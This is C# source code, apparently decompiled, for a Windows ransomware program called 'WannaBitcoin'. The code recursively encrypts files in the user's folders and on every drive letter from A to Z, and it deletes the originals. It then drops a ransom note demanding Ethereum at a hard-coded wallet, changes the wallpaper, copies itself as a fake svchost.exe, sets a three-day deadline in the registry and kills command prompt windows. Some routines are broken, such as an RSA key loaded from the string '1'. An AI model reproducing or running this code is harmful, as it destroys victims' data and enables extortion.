using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace WannaBitcoin;

public class Form1 : Form
{
	public class KeyPair
	{
		public string PublicKey { get; set; }

		public string PrivateKey { get; set; }
	}

	private const bool DELETE_ALL_ORIGINALS = true;

	private const bool ENCRYPT_DESKTOP = true;

	private const bool ENCRYPT_DOWNLOAD = true;

	private const bool ENCRYPT_DOCUMENTS = true;

	private const bool ENCRYPT_PICTURES = true;

	private const bool ENCRYPT_VIDEOS = true;

	private const bool ENCRYPT_MUSIC = true;

	private const bool ENCRYPT_USER_ROOT = true;

	private const bool ENCRYPT_A_DRIVE = true;

	private const bool ENCRYPT_B_DRIVE = true;

	private const bool ENCRYPT_D_DRIVE = true;

	private const bool ENCRYPT_E_DRIVE = true;

	private const bool ENCRYPT_F_DRIVE = true;

	private const bool ENCRYPT_G_DRIVE = true;

	private const bool ENCRYPT_H_DRIVE = true;

	private const bool ENCRYPT_I_DRIVE = true;

	private const bool ENCRYPT_J_DRIVE = true;

	private const bool ENCRYPT_K_DRIVE = true;

	private const bool ENCRYPT_L_DRIVE = true;

	private const bool ENCRYPT_M_DRIVE = true;

	private const bool ENCRYPT_N_DRIVE = true;

	private const bool ENCRYPT_O_DRIVE = true;

	private const bool ENCRYPT_P_DRIVE = true;

	private const bool ENCRYPT_Q_DRIVE = true;

	private const bool ENCRYPT_R_DRIVE = true;

	private const bool ENCRYPT_S_DRIVE = true;

	private const bool ENCRYPT_T_DRIVE = true;

	private const bool ENCRYPT_U_DRIVE = true;

	private const bool ENCRYPT_V_DRIVE = true;

	private const bool ENCRYPT_W_DRIVE = true;

	private const bool ENCRYPT_X_DRIVE = true;

	private const bool ENCRYPT_Y_DRIVE = true;

	private const bool ENCRYPT_Z_DRIVE = true;

	private const string ENCRYPTED_FILE_EXTENSION = ".wannabitcoin";

	private const string ENCRYPT_PASSWORD = "Password1";

	private const string ETH_ADDRESS = "0xF37552d92C1EB2b3e57965649fa2c5f94bE8F18A";

	private const string BITCOIN_RANSOM_AMOUNT = "1";

	private const string EMAIL_ADDRESS = "this.email.address@gmail.com";

	private static string ENCRYPTION_LOG = "";

	private string RANSOM_LETTER = "All of your files have been encrypted by WannaBitcoin.\n\nTo dercrypt your files 1 to: 0xF37552d92C1EB2b3e57965649fa2c5f94bE8F18A\nAfter you sent 1 ETH, please click on the Check Payment button.\n\nEncryption Log:\n----------------------------------------\n";

	private string DESKTOP_FOLDER = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);

	private string USER_ROOT = Environment.GetEnvironmentVariable("USERPROFILE");

	private string APPDATA = Environment.ExpandEnvironmentVariables("%localappdata%\\Microsoft\\Windows");

	private string DOWNLOAD_FOLDER = Path.Combine(Environment.GetEnvironmentVariable("USERPROFILE"), "Downloads");

	private string DOCUMENTS_FOLDER = Environment.GetFolderPath(Environment.SpecialFolder.Personal);

	private string PICTURES_FOLDER = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures);

	private string VIDEOS_FOLDER = Environment.GetFolderPath(Environment.SpecialFolder.MyVideos);

	private string MUSIC_FOLDER = Environment.GetFolderPath(Environment.SpecialFolder.MyMusic);

	private string A_DRIVE = "A:\\";

	private string B_DRIVE = "B:\\";

	private string D_DRIVE = "D:\\";

	private string E_DRIVE = "E:\\";

	private string F_DRIVE = "F:\\";

	private string G_DRIVE = "G:\\";

	private string H_DRIVE = "H:\\";

	private string I_DRIVE = "I:\\";

	private string J_DRIVE = "J:\\";

	private string K_DRIVE = "K:\\";

	private string L_DRIVE = "L:\\";

	private string M_DRIVE = "M:\\";

	private string N_DRIVE = "N:\\";

	private string O_DRIVE = "O:\\";

	private string P_DRIVE = "P:\\";

	private string Q_DRIVE = "Q:\\";

	private string R_DRIVE = "R:\\";

	private string S_DRIVE = "S:\\";

	private string T_DRIVE = "T:\\";

	private string U_DRIVE = "U:\\";

	private string V_DRIVE = "V:\\";

	private string W_DRIVE = "W:\\";

	private string X_DRIVE = "X:\\";

	private string Y_DRIVE = "Y:\\";

	private string Z_DRIVE = "Z:\\";

	private static int encryptedFileCount = 0;

	private static readonly uint SPI_SETDESKWALLPAPER = 20u;

	private static readonly uint SPIF_UPDATEINIFILE = 1u;

	private static readonly uint SPIF_SENDWININICHANGE = 2u;

	private IContainer components = null;

	private PictureBox pictureBox1;

	private Timer timer1;

	private Label label1;

	private Panel panel1;

	private Label label2;

	private Panel panel2;

	private Label label3;

	private TextBox textBox1;

	private Button button1;

	private Timer timer2;

	private NotifyIcon notifyIcon1;

	private LinkLabel linkLabel1;

	private Panel panel3;

	private Panel panel4;

	public Form1()
	{
		InitializeComponent();
	}

	private void linkLabel1_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
	{
		Process.Start("https://en.wikipedia.org/wiki/Ethereum");
	}

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern int SystemParametersInfo(uint action, uint uParam, string vParam, uint winIni);

	public void SetWallpaper(string path)
	{
		SystemParametersInfo(SPI_SETDESKWALLPAPER, 0u, path, SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE);
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		encryptFolderContents(DESKTOP_FOLDER);
		encryptFolderContents(PICTURES_FOLDER);
		EncryptFile(DOCUMENTS_FOLDER);
		encryptFolderContents(DOWNLOAD_FOLDER);
		encryptFolderContents(VIDEOS_FOLDER);
		encryptFolderContents(MUSIC_FOLDER);
		encryptFolderContents(USER_ROOT);
		encryptFolderContents(A_DRIVE);
		encryptFolderContents(B_DRIVE);
		encryptFolderContents(D_DRIVE);
		encryptFolderContents(E_DRIVE);
		encryptFolderContents(F_DRIVE);
		encryptFolderContents(G_DRIVE);
		encryptFolderContents(H_DRIVE);
		encryptFolderContents(I_DRIVE);
		encryptFolderContents(J_DRIVE);
		encryptFolderContents(K_DRIVE);
		encryptFolderContents(L_DRIVE);
		encryptFolderContents(M_DRIVE);
		encryptFolderContents(N_DRIVE);
		encryptFolderContents(O_DRIVE);
		encryptFolderContents(P_DRIVE);
		encryptFolderContents(Q_DRIVE);
		encryptFolderContents(R_DRIVE);
		encryptFolderContents(S_DRIVE);
		encryptFolderContents(T_DRIVE);
		encryptFolderContents(U_DRIVE);
		encryptFolderContents(V_DRIVE);
		encryptFolderContents(W_DRIVE);
		encryptFolderContents(X_DRIVE);
		encryptFolderContents(Y_DRIVE);
		encryptFolderContents(Z_DRIVE);
		if (encryptedFileCount > 0)
		{
			dropRansomLetter();
		}
		Process currentProcess = Process.GetCurrentProcess();
		string fileName = currentProcess.MainModule!.FileName;
		if (File.Exists(Environment.ExpandEnvironmentVariables("%localappdata%\\Microsoft\\Windows\\svchost.exe")))
		{
			File.Delete(Environment.ExpandEnvironmentVariables("%localappdata%\\Microsoft\\Windows\\svchost.exe"));
		}
		if (File.Exists(Environment.ExpandEnvironmentVariables("%localappdata%\\Microsoft\\Windows\\wallpaper\\wp.bmp")))
		{
			File.Delete(Environment.ExpandEnvironmentVariables("%localappdata%\\Microsoft\\Windows\\wallpaper\\wp.bmp"));
		}
		else
		{
			string[] manifestResourceNames = Assembly.GetExecutingAssembly().GetManifestResourceNames();
			string[] array = manifestResourceNames;
			foreach (string name in array)
			{
				using FileStream destination = File.Create(Environment.ExpandEnvironmentVariables("%localappdata%\\Microsoft\\Windows\\wallpaper.bmp"));
				Assembly.GetExecutingAssembly().GetManifestResourceStream(name)!.CopyTo(destination);
			}
		}
		SetWallpaper(Environment.ExpandEnvironmentVariables("%localappdata%\\Microsoft\\Windows\\wallpaper.bmp"));
		File.Copy(fileName, Environment.ExpandEnvironmentVariables("%localappdata%\\Microsoft\\Windows\\svchost.exe"));
		using RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey("SOFTWARE\\Windows\\CurrentVersion\\WannaBitocin");
		if (registryKey != null)
		{
			RegistryKey registryKey2 = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey("SOFTWARE\\Windows\\CurrentVersion\\WannaBitocin");
			timer1.Stop();
			((Control)label1).set_Text("Your file will can't recovery permanently on " + (string)registryKey2.GetValue("Date"));
			return;
		}
		timer1.Start();
		RegistryKey registryKey3 = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).CreateSubKey("SOFTWARE\\Windows\\CurrentVersion\\WannaBitocin");
		registryKey3.SetValue("Date", DateTime.Now.AddDays(3.0).ToString("yyyy/MM/dd 00:00"));
		RegistryKey registryKey4 = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey("SOFTWARE\\Windows\\CurrentVersion\\WannaBitocin");
		timer1.Stop();
		((Control)label1).set_Text("Your file will can't recovery permanently on " + (string)registryKey4.GetValue("Date"));
		timer2.Start();
	}

	private void dropRansomLetter()
	{
		StreamWriter streamWriter = new StreamWriter(DESKTOP_FOLDER + "\\READ ME TO RECOVER YOUR FILES.wannabitcoin.txt");
		streamWriter.WriteLine(RANSOM_LETTER);
		streamWriter.WriteLine(ENCRYPTION_LOG);
		streamWriter.Close();
	}

	private void timer1_Tick(object sender, EventArgs e)
	{
	}

	private void button1_Click(object sender, EventArgs e)
	{
		//IL_000f: Unknown result type (might be due to invalid IL or missing references)
		Thread.Sleep(3000);
		MessageBox.Show("We didn't recived. If you send your bitcoin within 12 hours, please wait for 48 hours.");
	}

	private void timer2_Tick(object sender, EventArgs e)
	{
		Process[] processesByName = Process.GetProcessesByName("cmd");
		foreach (Process process in processesByName)
		{
			process.Kill();
		}
	}

	private void Form1_FormClosing(object sender, FormClosingEventArgs e)
	{
	}

	private void notifyIcon1_MouseDoubleClick(object sender, MouseEventArgs e)
	{
		Application.Exit();
	}

	private static void encryptFolderContents(string sDir)
	{
		try
		{
			string[] files = Directory.GetFiles(sDir);
			foreach (string text in files)
			{
				if (!text.Contains(".wannabitcoin"))
				{
					Console.Out.WriteLine("Encrypting: " + text);
					FileEncrypt(text, "Password1");
				}
			}
			string[] directories = Directory.GetDirectories(sDir);
			foreach (string sDir2 in directories)
			{
				encryptFolderContents(sDir2);
			}
		}
		catch (Exception ex)
		{
			Console.WriteLine(ex.Message);
		}
	}

	private static void FileEncrypt(string inputFile, string password)
	{
		byte[] array = GenerateRandomSalt();
		FileStream fileStream = new FileStream(inputFile + ".wannabitcoin", FileMode.Create);
		byte[] bytes = Encoding.UTF8.GetBytes(password);
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		rijndaelManaged.Padding = PaddingMode.PKCS7;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(bytes, array, 50000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CBC;
		fileStream.Write(array, 0, array.Length);
		CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
		FileStream fileStream2 = new FileStream(inputFile, FileMode.Open);
		byte[] array2 = new byte[1048576];
		try
		{
			int count;
			while ((count = fileStream2.Read(array2, 0, array2.Length)) > 0)
			{
				cryptoStream.Write(array2, 0, count);
			}
			fileStream2.Close();
		}
		catch (Exception)
		{
		}
		finally
		{
			ENCRYPTION_LOG = ENCRYPTION_LOG + inputFile + "\n";
			encryptedFileCount++;
			cryptoStream.Close();
			fileStream.Close();
			File.Delete(inputFile);
		}
	}

	public static byte[] GenerateRandomSalt()
	{
		byte[] array = new byte[32];
		using (RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider())
		{
			for (int i = 0; i < 10; i++)
			{
				rNGCryptoServiceProvider.GetBytes(array);
			}
		}
		return array;
	}

	public void EncryptThreatingRSA(string file)
	{
		new Thread(EncryptFile).Start(file);
	}

	public void EncryptFile(object file)
	{
		try
		{
			byte[] inputString = File.ReadAllBytes(file.ToString());
			string s = EncryptString(inputString);
			File.WriteAllBytes(file.ToString(), Encoding.UTF8.GetBytes(s));
			File.Move(file.ToString(), file.ToString() + ".locked");
		}
		catch (Exception)
		{
		}
	}

	public string EncryptString(byte[] inputString)
	{
		string xmlString = "1";
		RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(8192);
		rSACryptoServiceProvider.FromXmlString(xmlString);
		int num = 982;
		int num2 = inputString.Length;
		int num3 = num2 / 982;
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 0; i <= num3; i++)
		{
			byte[] array = new byte[(num2 - num * i > num) ? num : (num2 - num * i)];
			Buffer.BlockCopy(inputString, num * i, array, 0, array.Length);
			byte[] array2 = rSACryptoServiceProvider.Encrypt(array, fOAEP: true);
			Array.Reverse((Array)array2);
			stringBuilder.Append(Convert.ToBase64String(array2));
		}
		return stringBuilder.ToString();
	}

	public static KeyPair GenerateNewKeyPair(int keySize = 4096)
	{
		using (new RSACryptoServiceProvider(keySize))
		{
			return new KeyPair
			{
				PublicKey = "MIIEIjANBgkqhkiG9w0BAQEFAAOCBA8AMIIECgKCBAEAyjtNbS2x3OeiRQlTThFl6SKw/ih73d2NItfKlKQwfNMgOHK7FTNURBWHPQDyqFmDpa7l9sAb+mfIQXCEwlm4+F6IgXFC1X6EuGEj5AUBgy4L90O2u2P1EhNFK5Mw72S9krFW9iqket4wcx0ewKNWKJiYyoHevh4fH/zvPi8rJXDdM9x1k0zSN1dslEszCH7kgC49LrbN4jvXWqhvzBtdk4U+DR1PVOu8QP3qmnIvOFoGF8RWsj7cy+J7PXLkUq6Mx8LwCJT7CM4wE4Ll/DJssmdoncPnZsbuYtpO62vOWEEYsVnAPlz1gVET4i/zsiN6p3NX/pyR5XkQo+heqzLChoOLLmpKl8KdDBO1H8urZjo4rNxSl+QiHFsRnKEjsrkPydeRdYTT6ls2wV8jt1Lzb+zVt/unK6L1hLBci7c11ZmqrcNRN+cP3ZsY5Av9ieGyaAquGXLKc/TkslwuaOR5Ee1XWlore+XT00PqnzFLz6nOTQmlQw8R0aD0RikoKnAEHVEcmZ4hV113J9a0f3pj2dVneAQcWJJQ75UA7Zpzi3VpS03HdnFdJ2kSYAQkPBdddp2JgxPu54YoXf7NnTr9W2MTCSHCDoGqfa4GU+OcJalWViSpo/eh8J2R17zK/BJIMMTCUblnMv3G2LdgsuBnKBf/pZnFwxc8cPSN4veEIeZ4RYHrWsLyfRh48Qlga41l6+XNlX9hm4dOa4fmdfGXPYQ8flTp6vI8vxqGc0/Z4gSdSq9gJHt3OLWqpgqDieAtKHBKC7XsKLcChlPLRr+8VnTFalmubwFfdfM028lPVXrGjhArvEsV1aXBv0SCTvq42cX/dqSLx7bDGxwFvKPW2Ag8z8Y4DNYCb8fZ38rJYIN3FHeTxuqTYXKFf3CiJqOAeqmkAhLbyW9fC2XgU+W64up8he1+HU0jUnodGsLvSB28E5zLOmXAr6JZhtB93GJmEj+YHQS/8Wb7cLBEx4qbm6yW2Gk1dM0wbzsq9ZhjO4TNnOq5W3qrqXkiWXMWp26UASoZ3x9Kre9FQqqastjSD8iJG7S2qUyefw6I3JDQHBarl6qO6IgkqBjyCaO503f85rw1I0JeGyb77dGA0pu/dV4lmuM0tt1vvilTuSWkbDjwTe8hWw/3RL/dYVThL0Px2ZteXPe0hyuf7X6qj7pw6UzCitvU+IYCBxXy2RoxvJ8nfRhks021L8uwfGmJuVdqnbUvtwRe1mdlgJIr2BHMU61jjXl+NHT8aZXDmxA9fzYoQC7+bsS9i9VJ+/j35XBAHmOAdgFl2/cETpGN/auoro3My76Y5DYI5ITbt1RV1Oak+oyBsSH5syKTpbAWnpyOTx2WjNozFgsPb5x5oveeIwIDAQAB"
			};
		}
	}

	public static byte[] EncryptData(byte[] data, string publicKey)
	{
		using RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider();
		rSACryptoServiceProvider.FromXmlString(publicKey);
		return rSACryptoServiceProvider.Encrypt(data, fOAEP: true);
	}

	public static string EncryptString(string value, string publicKey)
	{
		return Convert.ToBase64String(EncryptData(Encoding.UTF8.GetBytes(value), publicKey));
	}

	public static void EncryptFile(string inputFilePath, string outputFilePath, string publicKey)
	{
		using AesManaged aesManaged = new AesManaged();
		byte[] array = new byte[aesManaged.KeySize / 8];
		byte[] array2 = new byte[aesManaged.BlockSize / 8];
		using (RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider())
		{
			rNGCryptoServiceProvider.GetBytes(array);
			rNGCryptoServiceProvider.GetBytes(array2);
		}
		byte[] array3 = new byte[array.Length + array2.Length];
		Array.Copy(array, array3, array.Length);
		Array.Copy(array2, 0, array3, array.Length, array2.Length);
		array3 = EncryptData(array3, publicKey);
		byte[] bytes = BitConverter.GetBytes(array3.Length);
		using ICryptoTransform transform = aesManaged.CreateEncryptor(array, array2);
		using FileStream fileStream2 = new FileStream(inputFilePath, FileMode.Open);
		using FileStream fileStream = new FileStream(outputFilePath, FileMode.Create);
		using CryptoStream destination = new CryptoStream(fileStream, transform, CryptoStreamMode.Write);
		fileStream.Write(bytes, 0, bytes.Length);
		fileStream.Write(array3, 0, array3.Length);
		fileStream2.CopyTo(destination);
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_004d: Expected O, but got Unknown
		//IL_004e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0058: Expected O, but got Unknown
		//IL_0059: Unknown result type (might be due to invalid IL or missing references)
		//IL_0063: Expected O, but got Unknown
		//IL_0064: Unknown result type (might be due to invalid IL or missing references)
		//IL_006e: Expected O, but got Unknown
		//IL_006f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0079: Expected O, but got Unknown
		//IL_007a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0084: Expected O, but got Unknown
		//IL_008b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0095: Expected O, but got Unknown
		//IL_009c: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a6: Expected O, but got Unknown
		//IL_00a7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b1: Expected O, but got Unknown
		//IL_00b2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00bc: Expected O, but got Unknown
		//IL_00bd: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c7: Expected O, but got Unknown
		//IL_010f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0119: Expected O, but got Unknown
		//IL_01b2: Unknown result type (might be due to invalid IL or missing references)
		//IL_01bc: Expected O, but got Unknown
		//IL_028a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0294: Expected O, but got Unknown
		//IL_0397: Unknown result type (might be due to invalid IL or missing references)
		//IL_03a1: Expected O, but got Unknown
		//IL_040f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0419: Expected O, but got Unknown
		//IL_04ac: Unknown result type (might be due to invalid IL or missing references)
		//IL_04b6: Expected O, but got Unknown
		//IL_055f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0569: Expected O, but got Unknown
		//IL_0592: Unknown result type (might be due to invalid IL or missing references)
		//IL_059c: Expected O, but got Unknown
		//IL_05bf: Unknown result type (might be due to invalid IL or missing references)
		//IL_05c9: Expected O, but got Unknown
		//IL_0648: Unknown result type (might be due to invalid IL or missing references)
		//IL_0652: Expected O, but got Unknown
		//IL_07ef: Unknown result type (might be due to invalid IL or missing references)
		//IL_07f9: Expected O, but got Unknown
		//IL_080c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0816: Expected O, but got Unknown
		//IL_0849: Unknown result type (might be due to invalid IL or missing references)
		//IL_0853: Expected O, but got Unknown
		components = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		pictureBox1 = new PictureBox();
		timer1 = new Timer(components);
		label1 = new Label();
		panel1 = new Panel();
		label2 = new Label();
		panel2 = new Panel();
		label3 = new Label();
		textBox1 = new TextBox();
		button1 = new Button();
		timer2 = new Timer(components);
		notifyIcon1 = new NotifyIcon(components);
		linkLabel1 = new LinkLabel();
		panel3 = new Panel();
		panel4 = new Panel();
		((ISupportInitialize)pictureBox1).BeginInit();
		((Control)panel2).SuspendLayout();
		((Control)panel4).SuspendLayout();
		((Control)this).SuspendLayout();
		((Control)pictureBox1).set_BackColor(Color.Transparent);
		pictureBox1.set_Image((Image)componentResourceManager.GetObject("pictureBox1.Image"));
		((Control)pictureBox1).set_Location(new Point(583, 12));
		((Control)pictureBox1).set_Name("pictureBox1");
		((Control)pictureBox1).set_Size(new Size(102, 91));
		pictureBox1.set_SizeMode((PictureBoxSizeMode)4);
		pictureBox1.set_TabIndex(0);
		pictureBox1.set_TabStop(false);
		timer1.add_Tick((EventHandler)timer1_Tick);
		((Control)label1).set_AutoSize(true);
		((Control)label1).set_Font(new Font("Taipei Sans TC Beta", 18f, (FontStyle)0, (GraphicsUnit)3, (byte)136));
		((Control)label1).set_Location(new Point(24, 56));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(79, 28));
		((Control)label1).set_TabIndex(6);
		((Control)label1).set_Text("label1");
		((Control)panel1).set_BackColor(Color.Red);
		((Control)panel1).set_Location(new Point(53, 165));
		((Control)panel1).set_Name("panel1");
		((Control)panel1).set_Size(new Size(18, 100));
		((Control)panel1).set_TabIndex(7);
		((Control)label2).set_AutoSize(true);
		((Control)label2).set_Font(new Font("Taipei Sans TC Beta", 18f, (FontStyle)1, (GraphicsUnit)3, (byte)136));
		((Control)label2).set_Location(new Point(432, 116));
		((Control)label2).set_Name("label2");
		((Control)label2).set_Size(new Size(393, 28));
		((Control)label2).set_TabIndex(8);
		((Control)label2).set_Text("Your files have been encrypted !");
		((Control)panel2).set_BackColor(Color.MistyRose);
		((Control)panel2).get_Controls().Add((Control)(object)label3);
		((Control)panel2).get_Controls().Add((Control)(object)label1);
		((Control)panel2).set_Location(new Point(68, 165));
		((Control)panel2).set_Name("panel2");
		((Control)panel2).set_Size(new Size(1126, 100));
		((Control)panel2).set_TabIndex(7);
		((Control)label3).set_AutoSize(true);
		((Control)label3).set_Font(new Font("Taipei Sans TC Beta", 18f, (FontStyle)0, (GraphicsUnit)3, (byte)136));
		((Control)label3).set_Location(new Point(24, 18));
		((Control)label3).set_Name("label3");
		((Control)label3).set_Size(new Size(359, 28));
		((Control)label3).set_TabIndex(8);
		((Control)label3).set_Text("Your files have been encrypted !");
		((Control)textBox1).set_Font(new Font("Taipei Sans TC Beta", 18f, (FontStyle)0, (GraphicsUnit)3, (byte)136));
		((Control)textBox1).set_Location(new Point(53, 284));
		((TextBoxBase)textBox1).set_Multiline(true);
		((Control)textBox1).set_Name("textBox1");
		textBox1.set_ScrollBars((ScrollBars)2);
		((Control)textBox1).set_Size(new Size(1141, 293));
		((Control)textBox1).set_TabIndex(9);
		((Control)textBox1).set_Text(componentResourceManager.GetString("textBox1.Text"));
		((Control)button1).set_Font(new Font("Taipei Sans TC Beta", 21.75f, (FontStyle)0, (GraphicsUnit)3, (byte)136));
		((Control)button1).set_Location(new Point(410, 611));
		((Control)button1).set_Name("button1");
		((Control)button1).set_Size(new Size(460, 58));
		((Control)button1).set_TabIndex(10);
		((Control)button1).set_Text("Check payment");
		((ButtonBase)button1).set_UseVisualStyleBackColor(true);
		((Control)button1).add_Click((EventHandler)button1_Click);
		timer2.add_Tick((EventHandler)timer2_Tick);
		notifyIcon1.set_Icon((Icon)componentResourceManager.GetObject("notifyIcon1.Icon"));
		notifyIcon1.set_Text("WannaBitcoin");
		notifyIcon1.set_Visible(true);
		notifyIcon1.add_MouseDoubleClick(new MouseEventHandler(notifyIcon1_MouseDoubleClick));
		((Control)linkLabel1).set_AutoSize(true);
		((Control)linkLabel1).set_Font(new Font("Taipei Sans TC Beta", 15.75f, (FontStyle)0, (GraphicsUnit)3, (byte)136));
		linkLabel1.set_LinkColor(Color.Black);
		((Control)linkLabel1).set_Location(new Point(18, 3));
		((Control)linkLabel1).set_Name("linkLabel1");
		((Control)linkLabel1).set_Size(new Size(195, 24));
		((Control)linkLabel1).set_TabIndex(3);
		linkLabel1.set_TabStop(true);
		((Control)linkLabel1).set_Text("What is ethereum?");
		linkLabel1.add_LinkClicked(new LinkLabelLinkClickedEventHandler(linkLabel1_LinkClicked));
		((Control)panel3).set_BackColor(Color.Orange);
		((Control)panel3).set_Location(new Point(53, 623));
		((Control)panel3).set_Name("panel3");
		((Control)panel3).set_Size(new Size(10, 33));
		((Control)panel3).set_TabIndex(7);
		((Control)panel4).set_BackColor(Color.LightYellow);
		((Control)panel4).get_Controls().Add((Control)(object)linkLabel1);
		((Control)panel4).set_Location(new Point(63, 623));
		((Control)panel4).set_Name("panel4");
		((Control)panel4).set_Size(new Size(235, 33));
		((Control)panel4).set_TabIndex(7);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 12f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackColor(SystemColors.Control);
		((Form)this).set_ClientSize(new Size(1227, 702));
		((Control)this).get_Controls().Add((Control)(object)button1);
		((Control)this).get_Controls().Add((Control)(object)textBox1);
		((Control)this).get_Controls().Add((Control)(object)label2);
		((Control)this).get_Controls().Add((Control)(object)panel4);
		((Control)this).get_Controls().Add((Control)(object)panel3);
		((Control)this).get_Controls().Add((Control)(object)panel2);
		((Control)this).get_Controls().Add((Control)(object)panel1);
		((Control)this).get_Controls().Add((Control)(object)pictureBox1);
		((Control)this).set_Font(new Font("新細明體", 9f, (FontStyle)0, (GraphicsUnit)3, (byte)136));
		((Form)this).set_FormBorderStyle((FormBorderStyle)1);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Form1");
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Control)this).set_Text("WannaBitcoin");
		((Form)this).add_FormClosing(new FormClosingEventHandler(Form1_FormClosing));
		((Form)this).add_Load((EventHandler)Form1_Load);
		((ISupportInitialize)pictureBox1).EndInit();
		((Control)panel2).ResumeLayout(false);
		((Control)panel2).PerformLayout();
		((Control)panel4).ResumeLayout(false);
		((Control)panel4).PerformLayout();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
